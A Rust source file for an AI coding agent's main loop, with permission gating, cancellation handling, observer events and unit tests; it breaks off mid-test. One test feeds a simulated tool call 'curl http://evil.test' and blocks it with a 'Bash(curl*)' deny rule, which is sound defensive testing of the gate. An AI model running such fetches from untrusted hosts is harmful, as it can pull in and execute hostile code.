//! Agent loop entry point.

use std::{panic::AssertUnwindSafe, sync::Arc};

use kuncode_core::{
    completion::{
        AssistantContent, CompletionModel, CompletionRequest, CompletionRequestBuilder, Message,
        ReasoningEffort, ToolChoice, ToolResult, ToolResultContent, Usage, UserContent,
    },
    non_empty_vec::NonEmptyVec,
};
use tokio_util::sync::CancellationToken;

use crate::{
    error::AgentError,
    observer::{AgentEvent, AgentObserver, EventKind, ToolFailure},
    permission::{Approver, AutoApprove, Decision, PermissionGate, PermissionPolicy, Prepared},
    registry::ToolRegistry,
    session::AgentSession,
    tool::{ToolContext, ToolError, ToolOutput},
};

const DEFAULT_MAX_ITERATIONS: usize = 50;

/// Runtime knobs for one agent loop.
#[derive(Clone, Debug)]
pub struct AgentConfig {
    /// Maximum number of model calls before the loop aborts.
    pub max_iterations: usize,
    /// Output token cap passed to each completion request.
    pub max_tokens: Option<u64>,
    /// Reasoning effort passed through to the provider.
    pub reasoning: Option<ReasoningEffort>,
    /// Tool-call policy passed through to the provider.
    pub tool_choice: Option<ToolChoice>,
    /// System prompt injected as the first message of every request.
    ///
    /// It is request-only and never stored in [`AgentSession`].
    pub system_prompt: Option<String>,
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            max_iterations: DEFAULT_MAX_ITERATIONS,
            max_tokens: Some(4096),
            reasoning: None,
            tool_choice: None,
            system_prompt: None,
        }
    }
}

/// Summary for one completed user turn appended to an existing transcript.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct AgentTurn {
    /// Index of the final assistant message inside the caller-owned transcript.
    pub final_message_index: usize,
    /// Provider usage aggregated across this turn's model calls.
    pub usage: Usage,
    /// Number of model calls performed for this turn.
    pub iterations: usize,
}

impl AgentTurn {
    /// Concatenates visible text blocks from the final assistant message.
    pub fn final_text(&self, session: &AgentSession) -> String {
        final_text_at(session.messages(), self.final_message_index)
    }
}

/// Minimal agent loop for model/tool/model interaction.
#[derive(Clone)]
pub struct AgentRunner<M> {
    model: M,
    registry: ToolRegistry,
    config: AgentConfig,
    /// Static permission rules, shared read-only across turns.
    policy: Arc<PermissionPolicy>,
    /// Side-effecting approval layer consulted on an `Ask` verdict.
    approver: Arc<dyn Approver>,
    /// Optional progress sink. With `None` (the default) [`emit`](Self::emit)
    /// invokes no observer and draws no `seq`.
    observer: Option<Arc<dyn AgentObserver>>,
}

impl<M> AgentRunner<M>
where
    M: CompletionModel,
{
    /// Creates a runner with default loop configuration.
    ///
    /// Defaults to the built-in deny rules and an [`AutoApprove`] approver, so
    /// dangerous commands are still blocked but nothing prompts. Callers that
    /// want a human in the loop set one via [`with_approver`](Self::with_approver).
    pub fn new(model: M, registry: ToolRegistry) -> Self {
        Self::with_config(model, registry, AgentConfig::default())
    }

    /// Creates a runner with explicit loop configuration.
    pub fn with_config(model: M, registry: ToolRegistry, config: AgentConfig) -> Self {
        Self {
            model,
            registry,
            config,
            policy: Arc::new(PermissionPolicy::builtin()),
            approver: Arc::new(AutoApprove),
            observer: None,
        }
    }

    /// Replaces the static permission policy.
    pub fn with_policy(mut self, policy: PermissionPolicy) -> Self {
        self.policy = Arc::new(policy);
        self
    }

    /// Replaces the approval layer (e.g. a terminal prompt in the CLI).
    pub fn with_approver(mut self, approver: Arc<dyn Approver>) -> Self {
        self.approver = approver;
        self
    }

    /// Attaches a progress observer (e.g. the CLI's terminal renderer).
    pub fn with_observer(mut self, observer: Arc<dyn AgentObserver>) -> Self {
        self.observer = Some(observer);
        self
    }

    /// Emits one event, but only when an observer is attached — with none the
    /// `seq` is left untouched and nothing is dispatched. The `seq` is drawn at
    /// emit time, the single source of total ordering.
    ///
    /// A panicking observer is isolated here: the rendering frontend must never
    /// be able to unwind the agent loop. This one chokepoint covers every sink —
    /// a bare observer as well as a
    /// [`CompositeObserver`](crate::observer::CompositeObserver), whose own
    /// per-observer guard additionally keeps siblings rendering when one panics.
    fn emit(&self, session: &mut AgentSession, iteration: Option<usize>, kind: EventKind) {
        if let Some(observer) = &self.observer {
            let event = AgentEvent {
                seq: session.next_seq(),
                iteration,
                kind,
            };
            let _ = std::panic::catch_unwind(AssertUnwindSafe(|| observer.on_event(&event)));
        }
    }

    /// Appends a user prompt, then advances the transcript until a final answer.
    pub async fn run_turn(
        &self,
        session: &mut AgentSession,
        prompt: impl Into<String>,
    ) -> Result<AgentTurn, AgentError> {
        self.run_turn_with(session, prompt, CancellationToken::new())
            .await
    }

    /// Like [`run_turn`](Self::run_turn) but with a caller-owned cancellation
    /// token (wire it to Ctrl-C for interruptible turns).
    pub async fn run_turn_with(
        &self,
        session: &mut AgentSession,
        prompt: impl Into<String>,
        cancel: CancellationToken,
    ) -> Result<AgentTurn, AgentError> {
        session.push_user(prompt);
        self.continue_session_with(session, cancel).await
    }

    /// Advances an existing transcript in place until the model stops calling tools.
    pub async fn continue_session(
        &self,
        session: &mut AgentSession,
    ) -> Result<AgentTurn, AgentError> {
        self.continue_session_with(session, CancellationToken::new())
            .await
    }

    /// Like [`continue_session`](Self::continue_session) but with a caller-owned
    /// cancellation token.
    pub async fn continue_session_with(
        &self,
        session: &mut AgentSession,
        cancel: CancellationToken,
    ) -> Result<AgentTurn, AgentError> {
        match self.run_loop(session, &cancel).await {
            Ok(turn) => Ok(turn),
            // The single turn-terminal emission point: every unwind path lands
            // here, so any open `ModelStart`/`ToolStart` UI state is closed
            // exactly once. `iteration` is `None` for failures with no owning
            // model call (empty transcript, `max_iterations == 0`).
            Err((iteration, error)) => {
                self.emit(
                    session,
                    iteration,
                    EventKind::Error {
                        kind: error_kind(&error).to_string(),
                        message: error.to_string(),
                    },
                );
                Err(error)
            }
        }
    }

    /// The model/tool loop. Returns the failing iteration alongside the error so
    /// [`continue_session_with`](Self::continue_session_with) can emit a single
    /// turn-terminal [`Error`](EventKind::Error) with the right `iteration`.
    async fn run_loop(
        &self,
        session: &mut AgentSession,
        cancel: &CancellationToken,
    ) -> Result<AgentTurn, (Option<usize>, AgentError)> {
        if session.is_empty() {
            return Err((None, AgentError::EmptyTranscript));
        }

        let mut usage = Usage::default();

        for iteration in 0..self.config.max_iterations {
            let iteration_result = self
                .run_iteration(session, iteration, cancel)
                .await
                .map_err(|error| (Some(iteration), error))?;
            usage += iteration_result.usage;

            if iteration_result.tool_calls.is_empty() {
                return Ok(AgentTurn {
                    final_message_index: iteration_result.assistant_message_index,
                    usage,
                    iterations: iteration + 1,
                });
            }

            self.execute_tool_calls(session, iteration_result.tool_calls, iteration, cancel)
                .await
                .map_err(|error| (Some(iteration), error))?;
        }

        Err((
            // The last model call we made, or `None` when the budget was 0.
            self.config.max_iterations.checked_sub(1),
            AgentError::MaxIterations {
                max_iterations: self.config.max_iterations,
                messages: session.messages().to_vec(),
                usage,
            },
        ))
    }

    async fn run_iteration(
        &self,
        session: &mut AgentSession,
        iteration: usize,
        cancel: &CancellationToken,
    ) -> Result<IterationResult, AgentError> {
        let request = self.build_request(session)?;
        // Open the "thinking" state only after a successful build (a build
        // failure never started a model call). On completion error/cancel the
        // turn-terminal `Error` closes it; on success the `Assistant` below does.
        self.emit(session, Some(iteration), EventKind::ModelStart);
        // Race the model call against cancellation. Waiting on the model is the
        // most common place a user hits Ctrl-C, so the token must cover it — not
        // just the later tool approval/execution. Dropping the future cancels
        // the in-flight request (e.g. the provider's HTTP call).
        let response = tokio::select! {
            result = self.model.completion(request) => result?,
            _ = cancel.cancelled() => return Err(AgentError::Cancelled),
        };

        let tool_calls = pending_tool_calls(&response.choice);
        let usage = response.usage;
        // Build the event payload before moving `response.choice` into the
        // transcript; `Assistant` doubles as the `ModelStart` close.
        let text = assistant_text(&response.choice);
        let tool_call_ids: Vec<String> = tool_calls.iter().map(|call| call.id.clone()).collect();
        self.emit(
            session,
            Some(iteration),
            EventKind::Assistant {
                text,
                tool_calls: tool_call_ids,
            },
        );

        session.push(Message::Assistant {
            id: response.message_id,
            content: response.choice,
        });

        Ok(IterationResult {
            assistant_message_index: session.messages().len() - 1,
            usage,
            tool_calls,
        })
    }

    async fn execute_tool_calls(
        &self,
        session: &mut AgentSession,
        tool_calls: Vec<PendingToolCall>,
        iteration: usize,
        cancel: &CancellationToken,
    ) -> Result<(), AgentError> {
        for index in 0..tool_calls.len() {
            let ctx = ToolContext::with_cancel(cancel.clone());
            let id = tool_calls[index].id.clone();
            let call_id = tool_calls[index].call_id.clone();
            let name = tool_calls[index].name.clone();
            let arguments = tool_calls[index].arguments.clone();

            match self
                .gated_call(session, iteration, &id, &name, arguments, &ctx)
                .await
            {
                Ok(output) => {
                    self.emit_tool_end(session, iteration, &id, &name, &output);
                    session.push(tool_result_message(id, call_id, output.to_model_content()));
                }
                Err(error) => {
                    // The turn is unwinding with this tool_call — and any that
                    // follow it — still unpaired. Pair each with a synthetic
                    // result so the assistant's tool_call message is never left
                    // dangling: most providers reject a request whose tool_call
                    // has no matching tool_result before the next user message.
                    //
                    // Pair `index` *honestly by why*: a harness tool error did
                    // run and fail, so don't relabel it "cancelled"; a
                    // cancel/abort did not run. Every following, never-reached
                    // call is interrupted.
                    let failed = match &error {
                        AgentError::Tool { source, .. } => {
                            ToolOutput::failure("tool_error", source.to_string())
                        }
                        _ => interrupted_tool_output(),
                    };
                    self.emit_tool_end(session, iteration, &id, &name, &failed);
                    session.push(tool_result_message(id, call_id, failed.to_model_content()));

                    for unpaired in &tool_calls[index + 1..] {
                        let interrupted = interrupted_tool_output();
                        self.emit_tool_end(
                            session,
                            iteration,
                            &unpaired.id,
                            &unpaired.name,
                            &interrupted,
                        );
                        session.push(tool_result_message(
                            unpaired.id.clone(),
                            unpaired.call_id.clone(),
                            interrupted.to_model_content(),
                        ));
                    }
                    return Err(error);
                }
            }
        }

        Ok(())
    }

    /// Emits the [`ToolEnd`](EventKind::ToolEnd) that mirrors `output` — same
    /// `ok`/`error`/`truncated` — kept beside every transcript write so the
    /// event and the result it describes can never drift apart.
    fn emit_tool_end(
        &self,
        session: &mut AgentSession,
        iteration: usize,
        tool_call_id: &str,
        tool: &str,
        output: &ToolOutput,
    ) {
        self.emit(
            session,
            Some(iteration),
            EventKind::ToolEnd {
                tool_call_id: tool_call_id.to_string(),
                tool: tool.to_string(),
                ok: output.ok,
                truncated: output.truncated,
                error: output.error.as_ref().map(ToolFailure::from),
            },
        );
    }

    /// Gates a tool call, then dispatches. The gate races the approval prompt
    /// against cancellation; this method races execution.
    ///
    /// Returns a model-recoverable [`ToolOutput`] for unknown tools, bad
    /// arguments, and denials (the loop feeds these back). A user `Abort` or a
    /// cancelled token escalates to [`AgentError::Cancelled`], and a harness-
    /// level tool failure to [`AgentError::Tool`]; both unwind the whole turn.
    ///
    /// Emits [`EventKind::ToolStart`] between the gate's two phases — once a
    /// [`PermissionRequest`](crate::permission::PermissionRequest) is in hand —
    /// so an unknown tool / bad arguments (rejected by `prepare`) get a `ToolEnd`
    /// with no preceding `ToolStart`.
    async fn gated_call(
        &self,
        session: &mut AgentSession,
        iteration: usize,
        tool_call_id: &str,
        name: &str,
        arguments: serde_json::Value,
        ctx: &ToolContext,
    ) -> Result<ToolOutput, AgentError> {
        let gate = PermissionGate {
            policy: self.policy.as_ref(),
            approver: self.approver.as_ref(),
            registry: &self.registry,
        };

        // prepare: resolve + parse. An unknown tool / bad arguments never produce
        // a request, so they short-circuit here with no `ToolStart`.
        let (tool, arguments, request) = match gate.prepare(name, arguments, ctx) {
            Prepared::Ready {
                tool,
                args,
                request,
            } => (tool, args, request),
            Prepared::Rejected(output) => return Ok(output),
        };

        // The request confirms a real call and carries a human summary, so open
        // the tool's UI row now — before the (possibly blocking) approval inside
        // `decide`.
        self.emit(
            session,
            Some(iteration),
            EventKind::ToolStart {
                tool_call_id: tool_call_id.to_string(),
                tool: request.tool.clone(),
                summary: request.summary.clone(),
            },
        );

        match gate.decide(&request, session.permissions_mut(), ctx).await {
            Decision::Deny(output) => Ok(output),
            Decision::Abort => Err(AgentError::Cancelled),
            // Execute, racing cancellation so a long tool can be interrupted.
            Decision::Allow => {
                let result = tokio::select! {
                    result = tool.call(arguments, ctx) => result,
                    _ = ctx.cancel.cancelled() => Err(ToolError::Cancelled),
                };
                match result {
                    Ok(output) => Ok(output),
                    Err(ToolError::Cancelled) => Err(AgentError::Cancelled),
                    Err(source) => Err(AgentError::Tool {
                        name: name.to_string(),
                        source,
                    }),
                }
            }
        }
    }

    fn build_request(&self, session: &AgentSession) -> Result<CompletionRequest, AgentError> {
        if session.is_empty() {
            return Err(AgentError::EmptyTranscript);
        }

        let mut chat_history = Vec::with_capacity(
            session.messages().len() + usize::from(self.config.system_prompt.is_some()),
        );
        if let Some(system) = &self.config.system_prompt {
            chat_history.push(Message::system(system.clone()));
        }
        chat_history.extend(session.messages().iter().cloned());

        Ok(CompletionRequestBuilder::from_messages(
            NonEmptyVec::try_from(chat_history).map_err(|_| AgentError::EmptyTranscript)?,
        )
        .tools(self.registry.definition())
        .max_tokens(self.config.max_tokens)
        .reasoning(self.config.reasoning)
        .tool_choice(self.config.tool_choice.clone())
        .build())
    }
}

#[derive(Debug)]
struct IterationResult {
    assistant_message_index: usize,
    usage: Usage,
    tool_calls: Vec<PendingToolCall>,
}

#[derive(Debug)]
struct PendingToolCall {
    id: String,
    call_id: Option<String>,
    name: String,
    arguments: serde_json::Value,
}

fn pending_tool_calls(content: &NonEmptyVec<AssistantContent>) -> Vec<PendingToolCall> {
    content
        .iter()
        .filter_map(|content| match content {
            AssistantContent::ToolCall(tool_call) => Some(PendingToolCall {
                id: tool_call.id.clone(),
                call_id: tool_call.call_id.clone(),
                name: tool_call.function.name.clone(),
                arguments: tool_call.function.arguments.clone(),
            }),
            _ => None,
        })
        .collect()
}

fn tool_result_message(id: String, call_id: Option<String>, content: String) -> Message {
    Message::User {
        content: NonEmptyVec::new(UserContent::ToolResult(ToolResult {
            id,
            call_id,
            content: NonEmptyVec::new(ToolResultContent::text(content)),
        })),
    }
}

/// A synthetic tool result that pairs a tool_call the turn never executed —
/// because it was aborted or cancelled first. Without it the assistant's
/// tool_call message would dangle, and most providers reject a tool_call with
/// no matching tool_result on the next request. Returned as a [`ToolOutput`] so
/// the same value feeds both the transcript and its mirrored `ToolEnd`.
fn interrupted_tool_output() -> ToolOutput {
    ToolOutput::failure(
        "cancelled",
        "Tool call not executed: the turn was interrupted before this tool returned.",
    )
}

/// Maps an [`AgentError`] to the stable `kind` string on
/// [`EventKind::Error`]. Kept exhaustive so a new variant forces a decision.
fn error_kind(error: &AgentError) -> &'static str {
    match error {
        AgentError::Completion(_) => "completion",
        AgentError::Tool { .. } => "tool",
        AgentError::EmptyTranscript => "empty_transcript",
        AgentError::Cancelled => "cancelled",
        AgentError::MaxIterations { .. } => "max_iterations",
    }
}

fn assistant_content_at(
    messages: &[Message],
    index: usize,
) -> Option<&NonEmptyVec<AssistantContent>> {
    match messages.get(index) {
        Some(Message::Assistant { content, .. }) => Some(content),
        _ => None,
    }
}

fn final_text_at(messages: &[Message], index: usize) -> String {
    assistant_content_at(messages, index)
        .map(assistant_text)
        .unwrap_or_default()
}

fn assistant_text(content: &NonEmptyVec<AssistantContent>) -> String {
    content
        .iter()
        .filter_map(|content| match content {
            AssistantContent::Text(text) => Some(text.text_ref()),
            _ => None,
        })
        .collect::<Vec<_>>()
        .join("")
}

#[cfg(test)]
mod tests {
    use std::{
        collections::VecDeque,
        sync::{Arc, Mutex},
    };

    use async_trait::async_trait;
    use kuncode_core::completion::{
        AssistantContent, CompletionError, CompletionRequest, CompletionResponse, CompletionStream,
        Message, ToolDefinition, ToolResultContent, Usage, UserContent,
    };
    use kuncode_core::non_empty_vec::NonEmptyVec;
    use schemars::JsonSchema;
    use serde::Deserialize;
    use serde_json::Value;
    use tokio_util::sync::CancellationToken;

    use super::{AgentConfig, AgentRunner};
    use crate::{
        error::AgentError,
        observer::{AgentEvent, AgentObserver, CompositeObserver, EventKind},
        permission::{
            ApprovalOutcome, PermissionAction, PermissionPolicy, PermissionRequest, RuleOrigin,
            ScriptedApprover, parse_rule,
        },
        registry::ToolRegistry,
        session::AgentSession,
        tool::{Tool, ToolContext, ToolError, ToolOutput, TypedTool, bash::Bash, definition_for},
    };

    /// A tool whose `run` never completes — used to test that a cancellation
    /// token interrupts an in-flight tool call. It is a `Read` so the gate
    /// allows it straight through to execution with no approval prompt.
    struct HangTool {
        definition: ToolDefinition,
    }

    #[derive(Deserialize, JsonSchema)]
    struct HangArgs {}

    impl HangTool {
        fn new() -> Self {
            Self {
                definition: definition_for::<HangArgs>("hang", "Never returns"),
            }
        }
    }

    #[async_trait]
    impl TypedTool for HangTool {
        type Args = HangArgs;
        type Output = Value;

        fn definition(&self) -> &ToolDefinition {
            &self.definition
        }

        fn permission(&self, _args: &HangArgs, _ctx: &ToolContext) -> PermissionRequest {
            PermissionRequest::new("hang", PermissionAction::Read, None, "hang")
        }

        async fn run(&self, _args: HangArgs, ctx: &ToolContext) -> ToolOutput<Value> {
            // Cancel from inside the running tool, then never return: this
            // deterministically drives the runner's execute-stage `select!` to
            // the cancellation branch without pre-cancelling the token (which
            // would also race the model stage).
            ctx.cancel.cancel();
            std::future::pending().await
        }
    }

    /// A model whose `completion` never returns — used to test that a
    /// cancellation token interrupts an in-flight *model* request, not only a
    /// tool approval/execution.
    #[derive(Clone, Default)]
    struct HangModel;

    impl kuncode_core::completion::CompletionModel for HangModel {
        type Response = Value;
        type Client = ();

        fn make(_client: &Self::Client, _model: impl Into<String>) -> Self {
            Self
        }

        async fn completion(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionResponse<Self::Response>, CompletionError> {
            std::future::pending().await
        }

        async fn stream(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionStream, CompletionError> {
            unimplemented!("hang model does not stream")
        }
    }

    /// Extracts the text of the tool-result user message at `index`.
    fn tool_result_text(session: &AgentSession, index: usize) -> String {
        match &session.messages()[index] {
            Message::User { content } => {
                let UserContent::ToolResult(result) = content.first() else {
                    panic!("expected tool result content at {index}");
                };
                let ToolResultContent::Text(text) = result.content.first();
                text.text_ref().to_string()
            }
            other => panic!("expected tool result user message at {index}, got {other:?}"),
        }
    }

    /// Extracts the tool-call id the tool-result user message at `index` answers.
    fn tool_result_id(session: &AgentSession, index: usize) -> String {
        match &session.messages()[index] {
            Message::User { content } => {
                let UserContent::ToolResult(result) = content.first() else {
                    panic!("expected tool result content at {index}");
                };
                result.id.clone()
            }
            other => panic!("expected tool result user message at {index}, got {other:?}"),
        }
    }

    async fn bash() -> Bash {
        Bash::from_current_dir()
            .await
            .expect("current directory should be a valid workspace")
    }

    #[derive(Clone, Default)]
    struct FakeModel {
        responses: Arc<Mutex<VecDeque<CompletionResponse<Value>>>>,
        requests: Arc<Mutex<Vec<CompletionRequest>>>,
    }

    impl FakeModel {
        fn new(responses: impl IntoIterator<Item = CompletionResponse<Value>>) -> Self {
            Self {
                responses: Arc::new(Mutex::new(responses.into_iter().collect())),
                requests: Arc::default(),
            }
        }

        fn requests(&self) -> Vec<CompletionRequest> {
            self.requests.lock().expect("requests lock").clone()
        }
    }

    impl kuncode_core::completion::CompletionModel for FakeModel {
        type Response = Value;
        type Client = ();

        fn make(_client: &Self::Client, _model: impl Into<String>) -> Self {
            Self::default()
        }

        async fn completion(
            &self,
            request: CompletionRequest,
        ) -> Result<CompletionResponse<Self::Response>, CompletionError> {
            self.requests.lock().expect("requests lock").push(request);
            Ok(self
                .responses
                .lock()
                .expect("responses lock")
                .pop_front()
                .expect("fake response queued"))
        }

        async fn stream(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionStream, CompletionError> {
            unimplemented!("fake model does not stream")
        }
    }

    fn response(content: AssistantContent) -> CompletionResponse<Value> {
        response_many(vec![content])
    }

    /// A response whose assistant message carries several content blocks (e.g.
    /// multiple tool calls in one turn).
    fn response_many(contents: Vec<AssistantContent>) -> CompletionResponse<Value> {
        CompletionResponse {
            choice: NonEmptyVec::try_from(contents).expect("at least one content block"),
            usage: Usage {
                input_tokens: 1,
                output_tokens: 2,
                total_tokens: 3,
                cached_input_tokens: 0,
                cache_creation_input_tokens: 0,
                reasoning_tokens: 0,
            },
            raw_response: serde_json::json!({}),
            message_id: None,
        }
    }

    #[tokio::test]
    async fn runs_tool_call_then_final_answer() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf s01" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::new(model.clone(), registry);
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "inspect the workspace")
            .await
            .expect("agent run should complete");

        assert_eq!(turn.final_text(&session), "done");
        assert_eq!(turn.iterations, 2);
        assert_eq!(turn.usage.total_tokens, 6);
        assert_eq!(session.messages().len(), 4);

        let requests = model.requests();
        assert_eq!(requests.len(), 2);
        assert_eq!(requests[0].tools[0].name, "bash");
        assert_eq!(requests[1].tools[0].name, "bash");
        assert_eq!(requests[1].chat_history.len(), 3);

        match &session.messages()[2] {
            Message::User { content } => {
                let UserContent::ToolResult(result) = content.first() else {
                    panic!("expected tool result content");
                };
                let ToolResultContent::Text(text) = result.content.first();
                assert!(text.text_ref().contains("\"stdout\":\"s01\""));
            }
            other => panic!("expected tool result user message, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn run_turn_updates_transcript_in_place() {
        let model = FakeModel::new([response(AssistantContent::text("done"))]);
        let runner = AgentRunner::new(model, ToolRegistry::new());
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "finish this")
            .await
            .expect("agent turn should complete");

        assert_eq!(turn.final_text(&session), "done");
        assert_eq!(turn.final_message_index, 1);
        assert_eq!(session.messages().len(), 2);
    }

    #[tokio::test]
    async fn requests_keep_stable_prefix_between_tool_iterations() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf cache" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::with_config(
            model.clone(),
            registry,
            AgentConfig {
                system_prompt: Some("be stable".to_string()),
                ..AgentConfig::default()
            },
        );
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "inspect the workspace")
            .await
            .expect("agent run should complete");

        let requests = model.requests();
        assert_eq!(requests.len(), 2);
        assert_eq!(requests[0].tools, requests[1].tools);
        assert!(
            requests[1]
                .chat_history
                .starts_with(&requests[0].chat_history)
        );
        assert_eq!(requests[0].chat_history.len(), 2);
        assert_eq!(requests[1].chat_history.len(), 4);
    }

    #[tokio::test]
    async fn stops_when_max_iterations_is_exhausted() {
        let model = FakeModel::new([response(AssistantContent::tool_call(
            "call_1",
            "bash",
            serde_json::json!({ "cmd": "printf loop" }),
        ))]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::with_config(
            model,
            registry,
            AgentConfig {
                max_iterations: 1,
                ..AgentConfig::default()
            },
        );
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "keep using tools")
            .await
            .expect_err("run should stop at the iteration budget");

        let AgentError::MaxIterations {
            max_iterations,
            messages,
            usage,
        } = err
        else {
            panic!("expected MaxIterations, got {err:?}");
        };

        assert_eq!(max_iterations, 1);
        // The partial transcript is preserved: user prompt, assistant tool
        // call, and the tool result appended before the budget was hit.
        assert_eq!(messages.len(), 3);
        assert_eq!(usage.total_tokens, 3);
    }

    #[tokio::test]
    async fn injects_system_prompt_as_first_message() {
        let model = FakeModel::new([response(AssistantContent::text("hi"))]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::with_config(
            model.clone(),
            registry,
            AgentConfig {
                system_prompt: Some("be terse".to_string()),
                ..AgentConfig::default()
            },
        );
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "hello")
            .await
            .expect("run completes");

        // The system prompt is request-only, never part of the transcript.
        assert!(!matches!(
            session.messages().first(),
            Some(Message::System { .. })
        ));

        let request = &model.requests()[0];
        let Message::System { content } = request.chat_history.first() else {
            panic!("system prompt should be the first message sent to the model");
        };
        assert_eq!(content, "be terse");
    }

    #[tokio::test]
    async fn rejects_empty_transcript() {
        let runner = AgentRunner::new(FakeModel::default(), ToolRegistry::new());
        let mut session = AgentSession::new();

        let err = runner
            .continue_session(&mut session)
            .await
            .expect_err("empty transcript is invalid");

        assert!(matches!(err, AgentError::EmptyTranscript));
    }

    #[tokio::test]
    async fn deny_rule_blocks_tool_with_permission_denied() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "curl http://evil.test" }),
            )),
            response(AssistantContent::text("understood")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let mut policy = PermissionPolicy::new();
        policy
            .deny
            .extend(parse_rule("Bash(curl*)", RuleOrigin::ProjectSettings).unwrap());
        let runner = AgentRunner::new(model, registry).with_policy(policy);
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "fetch the script")
            .await
            .expect("a denial is model-recoverable, so the turn still completes");

        // The tool never ran; the model got a clear permission_denied result.
        let result = tool_result_text(&session, 2);
        assert!(result.contains("permission_denied"), "got {result}");
        assert!(result.contains("Bash(curl*)"), "got {result}");
    }

    #[tokio::test]
    async fn allow_always_grant_skips_the_second_prompt() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf one" }),
            )),
            response(AssistantContent::tool_call(
                "call_2",
                "bash",
                serde_json::json!({ "cmd": "printf two" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let grant = parse_rule("Bash(printf*)", RuleOrigin::SessionGrant).unwrap()[0].clone();
        // Exactly ONE scripted outcome: if the second call also prompted, the
        // scripted approver would panic ("ran out of outcomes"). A clean pass
        // proves the session grant short-circuited the gate.
        let runner =
            AgentRunner::new(model, registry).with_approver(Arc::new(ScriptedApprover::new([
                ApprovalOutcome::AllowAlways(grant),
            ])));
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "print twice")
            .await
            .expect("both calls run, the second via the grant");

        assert_eq!(turn.final_text(&session), "done");
        assert!(tool_result_text(&session, 2).contains("\"stdout\":\"one\""));
        assert!(tool_result_text(&session, 4).contains("\"stdout\":\"two\""));
        // The grant is recorded on the session for later turns too.
        assert_eq!(session.permissions().allow_grants().len(), 1);
    }

    #[tokio::test]
    async fn abort_pairs_every_tool_call_with_a_result() {
        // One assistant turn emits TWO tool calls; the user aborts at the first
        // approval prompt. Both tool_calls must still get a tool_result, or the
        // assistant message dangles and the next turn's request is rejected.
        let model = FakeModel::new([response_many(vec![
            AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf one" }),
            ),
            AssistantContent::tool_call(
                "call_2",
                "bash",
                serde_json::json!({ "cmd": "printf two" }),
            ),
        ])]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::new(model, registry)
            .with_approver(Arc::new(ScriptedApprover::new([ApprovalOutcome::Abort])));
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "do two things")
            .await
            .expect_err("abort unwinds the whole turn");
        assert!(matches!(err, AgentError::Cancelled));

        // Transcript: user, assistant(2 tool_calls), tool_result(call_1),
        // tool_result(call_2) — every tool_call paired, so it is re-sendable.
        assert_eq!(session.messages().len(), 4);
        assert_eq!(tool_result_id(&session, 2), "call_1");
        assert_eq!(tool_result_id(&session, 3), "call_2");
        assert!(tool_result_text(&session, 2).contains("cancelled"));
        assert!(tool_result_text(&session, 3).contains("cancelled"));
    }

    #[tokio::test]
    async fn cancellation_token_interrupts_a_running_tool() {
        let model = FakeModel::new([response(AssistantContent::tool_call(
            "call_1",
            "hang",
            serde_json::json!({}),
        ))]);
        let mut registry = ToolRegistry::new();
        registry.register(HangTool::new());
        let runner = AgentRunner::new(model, registry);
        let mut session = AgentSession::new();

        // A fresh (un-cancelled) token: the model stage runs normally and the
        // `HangTool` cancels mid-run, so the interrupt lands specifically on the
        // tool-execution `select!`.
        let cancel = CancellationToken::new();

        let err = runner
            .run_turn_with(&mut session, "hang please", cancel)
            .await
            .expect_err("a tool that cancels mid-run interrupts the call");

        assert!(matches!(err, AgentError::Cancelled));
        // The cancelled tool_call is still paired with a synthetic result, so
        // the transcript stays re-sendable: user, assistant(1 call), tool_result.
        assert_eq!(session.messages().len(), 3);
        assert!(tool_result_text(&session, 2).contains("cancelled"));
    }

    #[tokio::test]
    async fn cancellation_token_interrupts_a_model_request() {
        let runner = AgentRunner::new(HangModel, ToolRegistry::new());
        let mut session = AgentSession::new();

        // Pre-cancelled token: the never-returning model loses the race to the
        // cancellation branch deterministically, proving the gate now wraps the
        // model call — not only tool approval/execution.
        let cancel = CancellationToken::new();
        cancel.cancel();

        let err = runner
            .run_turn_with(&mut session, "think forever", cancel)
            .await
            .expect_err("a cancelled token interrupts the model request");

        assert!(matches!(err, AgentError::Cancelled));
        // The turn aborted before any assistant message was appended: only the
        // user prompt is in the transcript.
        assert_eq!(session.messages().len(), 1);
    }

    /// Records every event so a test can assert on the full stream.
    #[derive(Default)]
    struct CollectingObserver {
        events: Mutex<Vec<AgentEvent>>,
    }

    impl AgentObserver for CollectingObserver {
        fn on_event(&self, event: &AgentEvent) {
            self.events.lock().expect("events lock").push(event.clone());
        }
    }

    impl CollectingObserver {
        fn events(&self) -> Vec<AgentEvent> {
            self.events.lock().expect("events lock").clone()
        }
    }

    /// An observer that always panics, to prove the composite isolates it.
    struct PanicObserver;

    impl AgentObserver for PanicObserver {
